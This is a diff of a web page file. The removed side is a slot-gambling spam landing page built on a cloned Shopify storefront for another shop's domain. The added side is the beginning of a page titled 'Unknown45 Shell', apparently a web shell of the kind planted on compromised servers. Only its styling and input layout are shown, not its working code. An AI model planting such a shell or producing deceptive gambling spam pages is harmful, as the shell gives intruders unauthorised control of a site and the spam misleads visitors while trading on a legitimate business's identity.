@@ -1,1698 +1,1719 @@
-<!doctype html>
-<html class="no-js" lang="id">
-  <head>
-    <meta charset="utf-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="viewport" content="width=device-width,initial-scale=1">
-    <meta name="theme-color" content="">
-    <link rel="canonical" href="<?php echo $urlPath ?>">
-    <link rel="amphtml" href="https://mugiwara.my.id/sakti/" />
-    <meta name="google-site-verification" content="wZjcF02qKegl7PcXRWPfT5J7dwhn0ny5pojQKNi_R7o" />
-    <link rel="preconnect" href="https://fonts.shopifycdn.com/" crossorigin>
-    <title><?php echo $BRANDS ?> » Situs Slot Gacor Resmi Mudah Jackpot 2024</title>
-    <meta name="description" content="<?php echo $BRANDS ?> ialah situs slot gacor yang sudah berdiri sejak 2015 hingga saat ini dan telah resmi menjadi platform untuk meraih jackpot dengan mudah di tahun 2024.">
-    <meta name="keywords" content="<?php echo $BRANDS ?>"  />
-    <meta property="og:site_name" content="<?php echo $BRANDS ?> » Situs Slot Gacor Resmi Mudah Jackpot 2024">
-    <meta property="og:url" content="<?php echo $urlPath ?>">
-    <meta property="og:title" content="<?php echo $BRANDS ?> » Situs Slot Gacor Resmi Mudah Jackpot 2024">
-    <meta property="og:type" content="product">
-    <meta property="og:description" content="<?php echo $BRANDS ?> ialah situs slot gacor yang sudah berdiri sejak 2015 hingga saat ini dan telah resmi menjadi platform untuk meraih jackpot dengan mudah di tahun 2024.">
-    <meta property="og:image" content="https://res.cloudinary.com/dbhs42bnh/image/upload/v1717229455/388.jpg?v=1702986579">
-    <meta property="og:image:secure_url" content="https://res.cloudinary.com/dbhs42bnh/image/upload/v1717229455/388.jpg?v=1702986579">
-    <meta property="og:image:width" content="750">
-    <meta property="og:image:height" content="550">
-    <meta property="og:price:amount" content="25,00">
-    <meta property="og:price:currency" content="IDR">
-    <meta name="twitter:card" content="summary_large_image">
-    <meta name="twitter:title" content="<?php echo $BRANDS ?> » Situs Slot Gacor Resmi Mudah Jackpot 2024">
-    <meta name="twitter:description" content="<?php echo $BRANDS ?> ialah situs slot gacor yang sudah berdiri sejak 2015 hingga saat ini dan telah resmi menjadi platform untuk meraih jackpot dengan mudah di tahun 2024.">
-    <meta name="robots" content="index, follow">
-    <script src="https://seafoodsallys.com/cdn/shop/t/1/assets/constantsf674.js?v=58251544750838685771702987225" defer="defer"></script>
-    <script src="https://seafoodsallys.com/cdn/shop/t/1/assets/pubsub48a7.js?v=158357773527763999511702987225" defer="defer"></script>
-    <script src="https://seafoodsallys.com/cdn/shop/t/1/assets/global9c0d.js?v=113367515774722599301702987225" defer="defer"></script>
-    <script src="https://seafoodsallys.com/cdn/shop/t/1/assets/animations10e9.js?v=88693664871331136111702987223" defer="defer"></script>
-    <script>window.performance && window.performance.mark && window.performance.mark('shopify.content_for_header.start');</script>
-    <meta id="shopify-digital-wallet" name="shopify-digital-wallet" content="/57966493774/digital_wallets/dialog">
-    <link rel="alternate" type="application/json+oembed" href="<?php echo $urlPath ?>">
-    <script async="async" src="checkouts/internal/preloads3379.js?permanent-domain=seafoodsallys.com&amp;locale=en-ID"></script>
-    <script id="shopify-features" type="application/json">
-      {
-        "accessToken": "9c33c74c8729466edb2d6e9f48274ec6",
-        "betas": ["rich-media-storefront-analytics"],
-        "domain": "seafoodsallys.com",
-        "predictiveSearch": true,
-        "shopId": 57966493774,
-        "smart_payment_buttons_url": "https:\/\/seafoodsallys.com\/cdn\/shopifycloud\/payment-sheet\/assets\/latest\/spb.en.js",
-        "dynamic_checkout_cart_url": "https:\/\/seafoodsallys.com\/cdn\/shopifycloud\/payment-sheet\/assets\/latest\/dynamic-checkout-cart.en.js",
-        "locale": "en",
-        "optimusEnabled": true,
-        "optimusHidden": false,
-        "betterDynamicCheckoutRecommendationVariant": "control",
-        "shopPromisePDPV3Enabled": true
-      }
-    </script>
-    <script>
-      var Shopify = Shopify || {};
-      Shopify.shop = "<?php echo $urlPath ?>";
-      Shopify.locale = "en";
-      Shopify.currency = {
-        "active": "IDR",
-        "rate": "1.0"
-      };
-      Shopify.country = "ID";
-      Shopify.theme = {
-        "name": "Refresh",
-        "id": 125872013390,
-        "theme_store_id": 1567,
-        "role": "main"
-      };
-      Shopify.theme.handle = "null";
-      Shopify.theme.style = {
-        "id": null,
-        "handle": null
-      };
-      Shopify.cdnHost = "<?php echo $urlPath ?>";
-      Shopify.routes = Shopify.routes || {};
-      Shopify.routes.root = "<?php echo $urlPath ?>";
-    </script>
-    <script type="module">!function(o){(o.Shopify=o.Shopify||{}).modules=!0}(window);</script>
-    <script>!function(o){function n(){var o=[];function n(){o.push(Array.prototype.slice.apply(arguments))}return n.q=o,n}var t=o.Shopify=o.Shopify||{};t.loadFeatures=n(),t.autoloadFeatures=n()}(window);</script>
-    <script id="__st">var __st={"a":57966493774,"offset":28800,"reqid":"48e29e57-e53a-427f-aee4-0604afd4eb38","pageurl":"seafoodsallys.com\/products\/slot","u":"639879ce8a9a","p":"product","rtyp":"product","rid":6962851840078};</script>
-    <script>window.ShopifyPaypalV4VisibilityTracking = true;</script>
-    <script>
-      ! function (o) {
-        o.addEventListener("DOMContentLoaded", function () {
-          window.Shopify = window.Shopify || {}, window.Shopify.recaptchaV3 = window.Shopify.recaptchaV3 || {
-            siteKey: "6LcCR2cUAAAAANS1Gpq_mDIJ2pQuJphsSQaUEuc9"
-          };
-          var t = ['form[action*="/contact"] input[name="form_type"][value="contact"]', 'form[action*="/comments"] input[name="form_type"][value="new_comment"]', 'form[action*="/account"] input[name="form_type"][value="customer_login"]', 'form[action*="/account"] input[name="form_type"][value="recover_customer_password"]', 'form[action*="/account"] input[name="form_type"][value="create_customer"]', 'form[action*="/contact"] input[name="form_type"][value="customer"]'].join(",");
+<!DOCTYPE HTML>
+<html>
+<head>
+<title>Unknown45 Shell</title>
+<meta name='author' content='Unknown45'>
+<meta charset="UTF-8">
+<style type='text/css'>
+@import url(https://fonts.googleapis.com/css?family=Abel);
+@import url(http://fonts.googleapis.com/css?family=Iceberg);
+html {background: #111111;color: #ffffff;font-family: 'Iceberg';font-size: 13px;width: 100%;}
+li {display: inline;margin: 5px;padding: 5px;}
+table, th, td {border-collapse:collapse;font-family: Tahoma, Geneva, sans-serif;background: transparent;font-family: 'Iceberg';font-size: 13px;}
+.table_home, .th_home, .td_home {border: 1px solid #ffffff;}
+.table_home tr:hover {background-color: green;}
+.th_home tr:hover{background-color: #1a1a1a;}
+.wenk{color: lime;}
+th {padding: 10px;}
+a {color: #ffffff;text-decoration: none;}
+a:hover {color: gold;text-decoration: underline;text-shadow: 0pt 0pt 0.9em lime, 0pt 0pt 0.9em lime;color: #00ff00;text-decoration: none;}
+#tangina:hover{ background-color: #1a1a1a; }
+b {color: gold;}
+input[type=text], input[type=password],input[type=submit] {background: transparent;color: #ffffff;border: 1px solid #ffffff;margin: 5px auto;padding-left: 5px;
+    font-family: 'Abel';font-size: 13px;}
+textarea {border: 1px solid #ffffff;width: 100%;height: 400px;padding-left: 5px;margin: 10px auto;resize: none;background: transparent;color: #ffffff;font-family: 'Abel';font-size: 13px;}
+select {background: transparent;color: #ffffff;border: 1px solid #ffffff;margin: 5px auto;padding-left: 5px;font-family: 'Abel';font-size: 13px;}
+.but {background: transparent;color: #ffffff;border: 1px solid #ffffff;margin: 5px auto;padding-left: 5px;font-family: 'Abel';font-size: 13px;}
+li a:hover{text-shadow: 0pt 0pt 0.99em lime, 0pt 0pt 0.99em lime;color: #00ff00;text-decoration: none;}
+.th_home, .titulo {text-shadow: 0pt 0pt 0.99em lime, 0pt 0pt 0.99em lime;color: #00ff00;text-decoration: none;}
+.board {text-align: center;border: 1px solid rgba(255,180,0,0.4);border-radius: 4px;width: 500px;}
+.board p {font-size: 65px;font-family: 'Monoton', cursive;color: #fff;text-transform: uppercase;padding: 0;margin: 0;}
 
-          function n(e) {
-            e = e.target;
-            null == e || null != (e = function e(t, n) {
-              if (null == t.parentElement) return null;
-              if ("FORM" != t.parentElement.tagName) return e(t.parentElement, n);
-              for (var o = t.parentElement.action, r = 0; r < n.length; r++)
-                if (-1 !== o.indexOf(n[r])) return t.parentElement;
-              return null
-            }(e, ["/contact", "/comments", "/account"])) && null != e.querySelector(t) && ((e = o.createElement("script")).setAttribute("src", "https://cdn.shopify.com/shopifycloud/storefront-recaptcha-v3/v0.6/index.js"), o.body.appendChild(e), o.removeEventListener("focus", n, !0), o.removeEventListener("change", n, !0), o.removeEventListener("click", n, !0))
-          }
-          o.addEventListener("click", n, !0), o.addEventListener("change", n, !0), o.addEventListener("focus", n, !0)
-        })
-      }
-      (document);
-      Shopify.country = "ID";
-      Shopify.theme = {
-        "name": "Refresh",
-        "id": 125872013390,
-        "theme_store_id": 1567,
-        "role": "main"
-      };
-      Shopify.theme.handle = "null";
-      Shopify.theme.style = {
-        "id": null,
-        "handle": null
-      };
-      Shopify.cdnHost = "<?php echo $urlPath ?>";
-      Shopify.routes = Shopify.routes || {};
-      Shopify.routes.root = "<?php echo $urlPath ?>";
-    </script>
-    <script integrity="sha256-h4dvokWvGcvRSqiG7VnGqoonxF0k3NeoHPLSMjUGIz4=" data-source-attribution="shopify.loadfeatures" defer="defer" src="cdn/shopifycloud/shopify/assets/storefront/load_feature-87876fa245af19cbd14aa886ed59c6aa8a27c45d24dcd7a81cf2d2323506233e.html" crossorigin="anonymous"></script>
-    <script integrity="sha256-HAs5a9TQVLlKuuHrahvWuke+s1UlxXohfHeoYv8G2D8=" data-source-attribution="shopify.dynamic-checkout" defer="defer" src="cdn/shopifycloud/shopify/assets/storefront/features-1c0b396bd4d054b94abae1eb6a1bd6ba47beb35525c57a217c77a862ff06d83f.html" crossorigin="anonymous"></script>
-    <script id="sections-script" data-sections="header" defer="defer" src="https://seafoodsallys.com/cdn/shop/t/1/compiled_assets/scripts8e29.js?25"></script>
-    <style id="shopify-dynamic-checkout">
-      .shopify-payment-button__button--hidden {
-        visibility: hidden;
-      }
-      .shopify-payment-button__button {
-        border-radius: 4px;
-        border: none;
-        box-shadow: 0 0 0 0 transparent;
-        color: rgb(44, 40, 40);
-        cursor: pointer;
-        display: block;
-        font-size: 1em;
-        font-weight: 500;
-        line-height: 1;
-        text-align: center;
-        width: 100%;
-        transition: background 0.2s ease-in-out;
-      }
-      .shopify-payment-button__button[disabled] {
-        opacity: 0.6;
-        cursor: default;
-      }
-      .shopify-payment-button__button--unbranded {
-        background-color: #1b1c1d;
-        padding: 1em 2em;
-      }
-      .shopify-payment-button__button--unbranded:hover:not([disabled]) {
-        background-color: #1d1e1f;
-      }
-      .shopify-payment-button__more-options {
-        background: transparent;
-        border: 0 none;
-        cursor: pointer;
-        display: block;
-        font-size: 1em;
-        margin-top: 1em;
-        text-align: center;
-        width: 100%;
-      }
-      .shopify-payment-button__more-options:hover:not([disabled]) {
-        text-decoration: underline;
-      }
-      .shopify-payment-button__more-options[disabled] {
-        opacity: 0.6;
-        cursor: not-allowed;
-      }
-      .shopify-payment-button__button--branded {
-        display: flex;
-        flex-direction: column;
-        min-height: 44px;
-        position: relative;
-        z-index: 1;
-      }
-      .shopify-payment-button__button--branded .shopify-cleanslate {
-        flex: 1 !important;
-        display: flex !important;
-        flex-direction: column !important;
-      }
-      .shopify-payment-button__button.button.loading {
-        position: relative;
-        color: transparent;
-      }
-      .shopify-payment-button__button.button.loading > .loading-overlay__spinner {
-        top: 50%;
-        left: 50%;
-        transform: translate(-50%, -50%);
-        position: absolute;
-        height: 100%;
-        display: flex;
-        align-items: center;
-      }
+</style>
+<style type='text/css'>
+@import url(https://fonts.googleapis.com/css?family=Ubuntu);
+html {
+    background: #1e1e1e;
+	color: #ffffff;
+	font-size: 14px;
+	width: 100%;
+}
 
-      .shopify-payment-button__button.button.loading > .loading-overlay__spinner .spinner {
-        width: -moz-fit-content;
-        width: fit-content;
-      }
+li {
+	display: inline;
+	margin: 5px;
+	padding: 5px;
+}
 
-      .button.loading > .loading-overlay__spinner .path {
-        stroke: rgb(43, 39, 39);
-      }
+a {
+	color: #ffffff;
+	text-decoration: none;
+}
 
-      .shopify-payment-button__button .loading-overlay__spinner {
-        width: 1.8rem;
-        display: inline-block;
-      }
+a:hover {
+	color: gold;
+	text-decoration: underline;
+}
 
-      .shopify-payment-button__button .spinner {
-        animation: shopify-rotator 1.4s linear infinite;
-      }
+b {
+	color: gold;
+}
 
-      @keyframes shopify-rotator {
-        0% {
-          transform: rotate(0deg);
-        }
-        100% {
-          transform: rotate(270deg);
-        }
-      }
+pre {
+	font-size: 13px;
+}
 
-      .shopify-payment-button__button .path {
-        stroke-dasharray: 280;
-        stroke-dashoffset: 0;
-        transform-origin: center;
-        stroke: rgb(18,18,18);
-        animation: shopify-dash 1.4s ease-in-out infinite;
-      }
+table, th, td {
+	border-collapse:collapse;
+	background: transparent;
+	font-family: 'Ubuntu';
+	font-size: 13px;
+}
 
-      @media screen and (forced-colors: active) {
-        .shopify-payment-button__button .path{
-          stroke: CanvasText;
-        }
-      }
+.table_home, .th_home, .td_home {
+	border: 1px solid #ffffff;
+}
 
-      @keyframes shopify-dash {
-        0% {
-          stroke-dashoffset: 280;
-        }
-        50% {
-          stroke-dashoffset: 75;
-          transform: rotate(135deg);
-        }
-        100% {
-          stroke-dashoffset: 280;
-          transform: rotate(450deg);
-        }
-      }
-    </style>
-    <script>window.performance && window.performance.mark && window.performance.mark('shopify.content_for_header.end');</script>
-    <style data-shopify>
-      @font-face {
-        font-family: Roboto;
-        font-weight: 400;
-        font-style: normal;
-        font-display: swap;
-        src: url("https://seafoodsallys.com/cdn/fonts/roboto/Roboto-Bold.woff2") format("woff2"), url("https://seafoodsallys.com/cdn/fonts/roboto/Roboto-Bold.woff") format("woff");
-      }
-      
-      @font-face {
-        font-family: Roboto;
-        font-weight: 700;
-        font-style: normal;
-        font-display: swap;
-        src: url("https://seafoodsallys.com/cdn/fonts/roboto/Roboto-Bold.woff2") format("woff2"), url("https://seafoodsallys.com/cdn/fonts/roboto/Roboto-Bold.woff") format("woff");
-      }
-      
-      :root,
-      .color-background-1 {
-        --color-background: 36,36,145;
-        --gradient-background: #201c02;
-        --color-foreground: 255,255,255;
-        --color-background-contrast: 161,166,196;
-        --color-shadow: 255,255,255;
-        --color-button: 71,112,219;
-        --color-button-text: 36,36,145;
-        --color-secondary-button: 36,36,145;
-        --color-secondary-button-text: 255,255,255;
-        --color-link: 161,0,25;
-        --color-badge-foreground: 255,255,255;
-        --color-badge-background: 36,36,145;
-        --color-badge-border: 255,255,255;
-        --payment-terms-background-color: rgb(24, 24, 26);
-      }
-      
-      .color-background-2 {
-        --color-background: 255,255,255;
-        --gradient-background: #222121;
-        --color-foreground: 255,255,255;
-        --color-background-contrast: 191,191,191;
-        --color-shadow: 255,255,255;
-        --color-button: 255,255,255;
-        --color-button-text: 255,255,255;
-        --color-secondary-button: 255,255,255;
-        --color-secondary-button-text: 255,255,255;
-        --color-link: 161,0,25;
-        --color-badge-foreground: 255,255,255;
-        --color-badge-background: 255,255,255;
-        --color-badge-border: 255,255,255;
-        --payment-terms-background-color: rgb(31, 30, 30);
-      }
-      
-      .color-inverse {
-        --color-background: 255,255,255;
-        --gradient-background: #b50b07;
-        --color-foreground: 255,255,255;
-        --color-background-contrast: 18,35,99;
-        --color-shadow: 255,255,255;
-        --color-button: 255,255,255;
-        --color-button-text: 255,255,255;
-        --color-secondary-button: 255,255,255;
-        --color-secondary-button-text: 255,255,255;
-        --color-link: 161,0,25;
-        --color-badge-foreground: 255,255,255;
-        --color-badge-background: 255,255,255;
-        --color-badge-border: 255,255,255;
-        --payment-terms-background-color: #b50b07;
-      }
-        
-      .color-accent-1 {
-        --color-background: 71,112,219;
-        --gradient-background: #21163d;
-        --color-foreground: 255,255,255;
-        --color-background-contrast: 27,57,136;
-        --color-shadow: 255,255,255;
-        --color-button: 255,255,255;
-        --color-button-text: 71,112,219;
-        --color-secondary-button: 71,112,219;
-        --color-secondary-button-text: 255,255,255;
-        --color-link: 161,0,25;
-        --color-badge-foreground: 255,255,255;
-        --color-badge-background: 71,112,219;
-        --color-badge-border: 255,255,255;
-        --payment-terms-background-color: rgb(29, 30, 32);
-      }
-      
-      .color-accent-2 {
-        --color-background: 227,36,2;
-        --gradient-background: #E32402;
-        --color-foreground: 255,255,255;
-        --color-background-contrast: 101,16,1;
-        --color-shadow: 255,255,255;
-        --color-button: 255,255,255;
-        --color-button-text: 227,36,2;
-        --color-secondary-button: 227,36,2;
-        --color-secondary-button-text: 255,255,255;
-        --color-link: 161,0,25;
-        --color-badge-foreground: 255,255,255;
-        --color-badge-background: 227,36,2;
-        --color-badge-border: 255,255,255;
-        --payment-terms-background-color: rgb(227 36 2);
-      }
-      
-      body, .color-background-1, .color-background-2, .color-inverse, .color-accent-1, .color-accent-2 {
-        color: rgba(var(--color-foreground), 0.75);
-        background-color: rgb(91 6 209);
-      }
+.th_home {
+	color: lime;
+}
 
-      :root {
-        --font-body-family: Calibri, sans-serif;
-        --font-body-style: normal;
-        --font-body-weight: 400;
-        --font-body-weight-bold: 700;
-        --font-heading-family: Calibri, serif;
-        --font-heading-style: normal;
-        --font-heading-weight: 700;
-        --font-body-scale: 1.05;
-        --font-heading-scale: 1.0476190476190477;
-        --media-padding: px;
-        --media-border-opacity: 0.1;
-        --media-border-width: 0px;
-        --media-radius: 20px;
-        --media-shadow-opacity: 0.0;
-        --media-shadow-horizontal-offset: 0px;
-        --media-shadow-vertical-offset: 4px;
-        --media-shadow-blur-radius: 5px;
-        --media-shadow-visible: 0;
-        --page-width: 120rem;
-        --page-width-margin: 0rem;
-        --product-card-image-padding: 1.6rem;
-        --product-card-corner-radius: 1.8rem;
-        --product-card-text-alignment: left;
-        --product-card-border-width: 0.1rem;
-        --product-card-border-opacity: 1.0;
-        --product-card-shadow-opacity: 0.0;
-        --product-card-shadow-visible: 0;
-        --product-card-shadow-horizontal-offset: 0.0rem;
-        --product-card-shadow-vertical-offset: 0.4rem;
-        --product-card-shadow-blur-radius: 0.5rem;
-        --collection-card-image-padding: 1.6rem;
-        --collection-card-corner-radius: 1.8rem;
-        --collection-card-text-alignment: left;
-        --collection-card-border-width: 0.1rem;
-        --collection-card-border-opacity: 1.0;
-        --collection-card-shadow-opacity: 0.0;
-        --collection-card-shadow-visible: 0;
-        --collection-card-shadow-horizontal-offset: 0.0rem;
-        --collection-card-shadow-vertical-offset: 0.4rem;
-        --collection-card-shadow-blur-radius: 0.5rem;
-        --blog-card-image-padding: 1.6rem;
-        --blog-card-corner-radius: 1.8rem;
-        --blog-card-text-alignment: left;
-        --blog-card-border-width: 0.1rem;
-        --blog-card-border-opacity: 1.0;
-        --blog-card-shadow-opacity: 0.0;
-        --blog-card-shadow-visible: 0;
-        --blog-card-shadow-horizontal-offset: 0.0rem;
-        --blog-card-shadow-vertical-offset: 0.4rem;
-        --blog-card-shadow-blur-radius: 0.5rem;
-        --badge-corner-radius: 0.0rem;
-        --popup-border-width: 1px;
-        --popup-border-opacity: 0.1;
-        --popup-corner-radius: 18px;
-        --popup-shadow-opacity: 0.0;
-        --popup-shadow-horizontal-offset: 0px;
-        --popup-shadow-vertical-offset: 4px;
-        --popup-shadow-blur-radius: 5px;
-        --drawer-border-width: 0px;
-        --drawer-border-opacity: 0.1;
-        --drawer-shadow-opacity: 0.0;
-        --drawer-shadow-horizontal-offset: 0px;
-        --drawer-shadow-vertical-offset: 4px;
-        --drawer-shadow-blur-radius: 5px;
-        --spacing-sections-desktop: 0px;
-        --spacing-sections-mobile: 0px;
-        --grid-desktop-vertical-spacing: 28px;
-        --grid-desktop-horizontal-spacing: 28px;
-        --grid-mobile-vertical-spacing: 14px;
-        --grid-mobile-horizontal-spacing: 14px;
-        --text-boxes-border-opacity: 0.1;
-        --text-boxes-border-width: 0px;
-        --text-boxes-radius: 20px;
-        --text-boxes-shadow-opacity: 0.0;
-        --text-boxes-shadow-visible: 0;
-        --text-boxes-shadow-horizontal-offset: 0px;
-        --text-boxes-shadow-vertical-offset: 4px;
-        --text-boxes-shadow-blur-radius: 5px;
-        --buttons-radius: 40px;
-        --buttons-radius-outset: 41px;
-        --buttons-border-width: 1px;
-        --buttons-border-opacity: 1.0;
-        --buttons-shadow-opacity: 0.0;
-        --buttons-shadow-visible: 0;
-        --buttons-shadow-horizontal-offset: 0px;
-        --buttons-shadow-vertical-offset: 4px;
-        --buttons-shadow-blur-radius: 5px;
-        --buttons-border-offset: 0.3px;
-        --inputs-radius: 26px;
-        --inputs-border-width: 1px;
-        --inputs-border-opacity: 0.55;
-        --inputs-shadow-opacity: 0.0;
-        --inputs-shadow-horizontal-offset: 0px;
-        --inputs-margin-offset: 0px;
-        --inputs-shadow-vertical-offset: 4px;
-        --inputs-shadow-blur-radius: 5px;
-        --inputs-radius-outset: 27px;
-        --variant-pills-radius: 40px;
-        --variant-pills-border-width: 1px;
-        --variant-pills-border-opacity: 0.55;
-        --variant-pills-shadow-opacity: 0.0;
-        --variant-pills-shadow-horizontal-offset: 0px;
-        --variant-pills-shadow-vertical-offset: 4px;
-        --variant-pills-shadow-blur-radius: 5px;
-      }
+.td_home, .td_home > a {
+	color: #ffffff;
+}
 
-      *,
-      *::before,
-      *::after {
-        box-sizing: inherit;
-      }
+.td_home > a:hover {
+	color: gold;
+}
 
-      html {
-        box-sizing: border-box;
-        font-size: calc(var(--font-body-scale) * 62.5%);
-        height: 100%;
-      }
+th {
+	padding: 10px;
+}
 
-      body {
-        display: grid;
-        grid-template-rows: auto auto 1fr auto;
-        grid-template-columns: 100%;
-        min-height: 100%;
-        margin: 0;
-        font-size: 1.5rem;
-        letter-spacing: 0.06rem;
-        line-height: calc(1 + 0.8 / var(--font-body-scale));
-        font-family: var(--font-body-family);
-        font-style: var(--font-body-style);
-        font-weight: var(--font-body-weight);
-      }
+tr:hover {
+	background: #006400;
+	color: #ffffff;
+}
 
-      .badge{
-        background-color:rgb(181 11 7);
-      }
+input[type=text], input[type=password], .input {
+	background: transparent; 
+	color: #ffffff;
+	border: 1px solid #ffffff;
+	padding: 3px;
+	font-family: 'Ubuntu';
+	font-size: 13px;
+}
 
-      @media screen and (min-width: 750px) {
-        body {
-          font-size: 1.6rem;
-        }
-      }
-    </style>
-    <link href="https://seafoodsallys.com/cdn/shop/t/1/assets/base9a61.css?v=127867003511637661291702987223" rel="stylesheet" type="text/css" media="all" />
-    <link rel="preload" as="font" href="https://seafoodsallys.com/cdn/fonts/roboto/Roboto-Bold.woff2" type="font/woff2" crossorigin>
-    <link rel="preload" as="font" href="https://seafoodsallys.com/cdn/fonts/roboto/Roboto-Bold.woff2" type="font/woff2" crossorigin>
-    <link rel="stylesheet" href="https://seafoodsallys.com/cdn/shop/t/1/assets/component-predictive-search279b.css?v=118923337488134913561702987224" media="print" onload="this.media='all'">
-    <link href="https://seafoodsallys.com/cdn/shop/t/1/assets/quantity-popover436e.html?v=153075665213740339621702987226" rel="stylesheet" type="text/css" media="all" />
-    <link href="https://seafoodsallys.com/cdn/shop/t/1/assets/component-cardc5f6.css?v=47260860684073105921702987223" rel="stylesheet" type="text/css" media="all" />
-    <script src="https://seafoodsallys.com/cdn/shop/t/1/assets/cart198a.html?v=56933888273975671431702987223" defer="defer"></script>
-    <script src="https://seafoodsallys.com/cdn/shop/t/1/assets/quantity-popover3566.html?v=19455713230017000861702987226" defer="defer"></script>
-    <script>
-      document.documentElement.className = document.documentElement.className.replace('no-js', 'js');
-      if (Shopify.designMode) {
-        document.documentElement.classList.add('shopify-design-mode');
-      }
-    </script>
-    <link href="https://monorail-edge.shopifysvc.com/" rel="dns-prefetch">
-    <script>
-      (function(){if ("sendBeacon" in navigator && "performance" in window) {var session_token = document.cookie.match(/_shopify_s=([^;]*)/);function handle_abandonment_event(e) {var entries = performance.getEntries().filter(function(entry) {return /monorail-edge.shopifysvc.com/.test(entry.name);});if (!window.abandonment_tracked && entries.length === 0) {window.abandonment_tracked = true;var currentMs = Date.now();var navigation_start = performance.timing.navigationStart;var payload = {shop_id: 57966493774,url: window.location.href,navigation_start,duration: currentMs - navigation_start,session_token: session_token && session_token.length === 2 ? session_token[1] : "",page_type: "product"};window.navigator.sendBeacon("https://monorail-edge.shopifysvc.com/v1/produce", JSON.stringify({schema_id: "online_store_buyer_site_abandonment/1.1",payload: payload,metadata: {event_created_at_ms: currentMs,event_sent_at_ms: currentMs}}));}}window.addEventListener('pagehide', handle_abandonment_event);}}());
-    </script>
-    <script id="web-pixels-manager-setup">
-      (function e(e,n,a,t,o,r,i){var s=null!==e,l=("function"==typeof BigInt&&BigInt.toString().indexOf("[native code]")?"modern":"legacy").substring(0,1),c=t.substring(0,1);if(s){window.Shopify=window.Shopify||{};var d=window.Shopify;d.analytics=d.analytics||{};var u=d.analytics;u.replayQueue=[],u.publish=function(e,n,a){u.replayQueue.push([e,n,a])};try{self.performance.mark("wpm:start")}catch(e){}}var p,f,y,h,v,m,w,g,b,_=[a,"/wpm","<?php echo $urlPath ?>",c,r,l,".js"].join("");f=(p={src:_,async:!0,onload:function(){if(e){var a=window.webPixelsManager.init(e);null==n||n(a);var t=window.Shopify.analytics;t.replayQueue.forEach((function(e){var n=e[0],t=e[1],o=e[2];a.publishCustomEvent(n,t,o)})),t.replayQueue=[],t.publish=a.publishCustomEvent,t.visitor=a.visitor}},onerror:function(){var n=(null==e?void 0:e.storefrontBaseUrl)?e.storefrontBaseUrl.replace(/\/$/,""):self.location.origin,a="".concat(n,"/.well-known/shopify/monorail/unstable/produce_batch"),t=JSON.stringify({metadata:{event_sent_at_ms:(new Date).getTime()},events:[{schema_id:"web_pixels_manager_load/2.0",payload:{version:o||"latest",page_url:self.location.href,status:"failed",error_msg:"".concat(_," has failed to load")},metadata:{event_created_at_ms:(new Date).getTime()}}]});try{if(self.navigator.sendBeacon.bind(self.navigator)(a,t))return!0}catch(e){}var r=new XMLHttpRequest;try{return r.open("POST",a,!0),r.setRequestHeader("Content-Type","text/plain"),r.send(t),!0}catch(e){console&&console.warn&&console.warn("[Web Pixels Manager] Got an unhandled error while logging a load error.")}return!1}}).src,y=p.async,h=void 0===y||y,v=p.onload,m=p.onerror,w=document.createElement("script"),g=document.head,b=document.body,w.async=h,w.src=f,v&&w.addEventListener("load",v),m&&w.addEventListener("error",m),g?g.appendChild(w):b?b.appendChild(w):console.error("Did not find a head or body element to append the script")})({shopId: 57966493774,storefrontBaseUrl: "<?php echo $urlPath ?>",cdnBaseUrl: "cdn",surface: "storefront-renderer",enabledBetaFlags: ["web_pixels_async_pixel_refactor","web_pixels_manager_performance_improvement"],webPixelsConfigList: [{"id":"shopify-app-pixel","configuration":"{}","eventPayloadVersion":"v1","runtimeContext":"STRICT","scriptVersion":"0570","apiClientId":"shopify-pixel","type":"APP"},{"id":"shopify-custom-pixel","eventPayloadVersion":"v1","runtimeContext":"LAX","scriptVersion":"0570","apiClientId":"shopify-pixel","type":"CUSTOM"}],initData: {"cart":null,"checkout":null,"customer":null,"productVariants":[{"id":"40476417982542","image":{"src":"\/\/seafoodsallys.com\/img\/slot-gacor-hari-ini.webp?v=1702986579"},"price":{"amount":2500000,"currencyCode":"IDR"},"product":{"id":"6962851840078","title":"<?php echo $BRANDS ?> » Situs Slot Gacor Resmi Mudah Jackpot 2024","untranslatedTitle":"<?php echo $BRANDS ?> » Situs Slot Gacor Resmi Mudah Jackpot 2024","url":"<?php echo $urlPath ?>","vendor":"<?php echo $BRANDS ?> » Situs Slot Gacor Resmi Mudah Jackpot 2024","type":""},"sku":"","title":"Default Title","untranslatedTitle":"Default Title"}]},},function pageEvents(webPixelsManagerAPI) {webPixelsManagerAPI.publish("page_viewed");webPixelsManagerAPI.publish("product_viewed", {"productVariant":{"id":"40476417982542","image":{"src":"\/\/seafoodsallys.com\/img\/slot-gacor-hari-ini.webp?v=1702986579"},"price":{"amount":2500000,"currencyCode":"IDR"},"product":{"id":"6962851840078","title":"<?php echo $BRANDS ?> » Situs Slot Gacor Resmi Mudah Jackpot 2024","untranslatedTitle":"<?php echo $BRANDS ?> » Situs Slot Gacor Resmi Mudah Jackpot 2024","url":"<?php echo $urlPath ?>","vendor":"<?php echo $BRANDS ?> » Situs Slot Gacor Resmi Mudah Jackpot 2024","type":""},"sku":"","title":"Default Title","untranslatedTitle":"Default Title"}});},"cdn","browser","0.0.412","80cd6a5fw8efabb83pbabe92ddm0cb690ee",["web_pixels_async_pixel_refactor","web_pixels_manager_performance_improvement"]);
-    </script>
-    <script>
-      window.ShopifyAnalytics = window.ShopifyAnalytics || {};
-      window.ShopifyAnalytics.meta = window.ShopifyAnalytics.meta || {};
-      window.ShopifyAnalytics.meta.currency = 'IDR';
-      var meta = {"product":{"id":6962851840078,"gid":"gid:\/\/shopify\/Product\/6962851840078","vendor":"<?php echo $BRANDS ?> » Situs Slot Gacor Resmi Mudah Jackpot 2024","type":"","variants":[{"id":40476417982542,"price":0,"name":"<?php echo $BRANDS ?> » Situs Slot Gacor Resmi Mudah Jackpot 2024","public_title":null,"sku":""}]},"page":{"pageType":"product","resourceType":"product","resourceId":6962851840078}};
-      for (var attr in meta) {
-      window.ShopifyAnalytics.meta[attr] = meta[attr];}
-    </script>
-    <script>window.ShopifyAnalytics.merchantGoogleAnalytics = function() {};</script>
-    <script class="analytics">
-      (function () {
-        var customDocumentWrite = function (content) {
-          var jquery = null;
-          if (window.jQuery) {
-            jquery = window.jQuery;
-          } else if (window.Checkout && window.Checkout.$) {
-            jquery = window.Checkout.$;
-          }
-          if (jquery) {
-            jquery('body').append(content);
-          }
-        };
-        var hasLoggedConversion = function (token) {
-          if (token) {
-            return document.cookie.indexOf('loggedConversion=' + token) !== -1;
-          }
-          return false;
-        }
-        var setCookieIfConversion = function (token) {
-          if (token) {
-            var twoMonthsFromNow = new Date(Date.now());
